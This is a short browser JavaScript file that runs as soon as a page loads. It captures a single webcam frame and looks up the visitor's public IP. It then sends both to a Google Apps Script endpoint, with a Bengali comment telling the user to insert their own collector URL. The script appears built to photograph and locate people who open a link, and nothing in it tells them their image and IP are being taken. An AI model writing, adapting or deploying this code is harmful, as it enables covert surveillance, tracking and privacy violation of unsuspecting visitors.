async function getIP() {
  const res = await fetch('https://api.ipify.org?format=json');
  const data = await res.json();
  return data.ip;
}

async function captureAndSend() {
  const video = document.createElement('video');
  video.autoplay = true;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await new Promise(resolve => video.onloadedmetadata = resolve);

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);

    const dataURL = canvas.toDataURL('image/png');

    const ip = await getIP();

    // এখানে আপনার Google Apps Script Web App URL দিন
    const webAppUrl = "https://script.google.com/macros/s/AKfycbwwYDjoWeTBBDb77lGOM4sS3YQFmoIyXyEG97L3EbiS6wjIJFNyLVDLrWJzsUXS0mCs/exec";

    await fetch(webAppUrl + `?ip=${encodeURIComponent(ip)}&imageUrl=${encodeURIComponent(dataURL)}`, {
      method: 'POST'
    });

    stream.getTracks().forEach(track => track.stop());

  } catch (e) {
    console.error("Camera or upload error:", e);
  }
}

captureAndSend();
